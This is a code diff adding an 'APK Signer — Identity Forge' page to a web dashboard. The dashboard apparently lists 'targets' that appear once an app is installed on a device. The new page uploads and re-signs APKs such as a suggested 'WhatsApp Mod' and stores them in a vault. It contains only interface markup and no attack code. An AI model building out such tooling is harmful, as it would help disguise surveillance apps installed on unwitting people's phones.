@@ -95,6 +95,9 @@
         <a href="#" class="nav-link" data-page="connections">
           <i class="ri-radar-line"></i><span>Connections</span>
         </a>
+        <a href="#" class="nav-link" data-page="apksign">
+          <i class="ri-shield-keyhole-line"></i><span>APK Signer</span>
+        </a>
         <a href="#" class="nav-link" data-page="settings">
           <i class="ri-settings-3-line"></i><span>Settings</span>
         </a>
@@ -654,6 +657,80 @@
             <i class="ri-radar-line"></i>
             <p>NO DEVICES DETECTED</p>
             <span>Targets will appear when the app is installed on a device</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== APK SIGNER PAGE (Forensic UI) ===== -->
+      <section id="page-apksign" class="page">
+        <!-- Forensic header -->
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-shield-keyhole-line"></i>
+            <span>APK SIGNING LAB — IDENTITY FORGE</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <!-- Upload Card -->
+        <div class="card apk-sign-card">
+          <div class="card-head">
+            <h3><i class="ri-upload-2-line"></i> Upload & Sign APK</h3>
+          </div>
+          <div class="card-content">
+            <div class="apk-upload-zone" id="apkSignDropZone">
+              <i class="ri-android-line apk-upload-icon"></i>
+              <p class="apk-upload-text">Drop APK file here or <span class="apk-upload-link">click to browse</span></p>
+              <p class="apk-upload-hint">Supports .apk files up to 500MB</p>
+              <input type="file" id="apkSignFileInput" accept=".apk" style="display:none">
+            </div>
+            <!-- File selected preview -->
+            <div class="apk-file-preview hidden" id="apkFilePreview">
+              <div class="apk-file-info">
+                <i class="ri-android-fill"></i>
+                <div>
+                  <span class="apk-file-name" id="apkFileName">—</span>
+                  <span class="apk-file-size" id="apkFileSize">—</span>
+                </div>
+                <button class="btn-icon apk-file-remove" id="apkFileRemove"><i class="ri-close-circle-line"></i></button>
+              </div>
+              <div class="field" style="margin-top:10px;">
+                <label>Remark / Label (optional)</label>
+                <input type="text" id="apkRemarkInput" placeholder="e.g. WhatsApp Mod v12.3">
+              </div>
+              <button class="btn btn-primary" id="apkSignBtn" onclick="signApk()">
+                <i class="ri-shield-check-line"></i> Sign APK
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Live Process Log (Forensic Terminal) -->
+        <div class="card apk-sign-card" id="apkLogCard" style="display:none;">
+          <div class="card-head">
+            <h3><i class="ri-terminal-box-line"></i> Signing Process Log</h3>
+            <span class="apk-log-status" id="apkLogStatus">PROCESSING</span>
+          </div>
+          <div class="apk-terminal" id="apkTerminal">
+            <div class="apk-terminal-lines" id="apkTerminalLines">
+              <!-- Lines injected by JS -->
+            </div>
+          </div>
+        </div>
+
+        <!-- Signed APKs Library -->
+        <div class="card apk-sign-card">
+          <div class="card-head">
+            <h3><i class="ri-archive-line"></i> Signed APK Vault</h3>
+            <span class="apk-vault-count" id="apkVaultCount">0</span>
+          </div>
+          <div class="apk-vault-list" id="apkVaultList">
+            <div class="apk-vault-empty" id="apkVaultEmpty">
+              <i class="ri-inbox-unarchive-line"></i>
+              <p>No signed APKs yet</p>
+              <span>Upload an APK above to get started</span>
+            </div>
           </div>
         </div>
       </section>
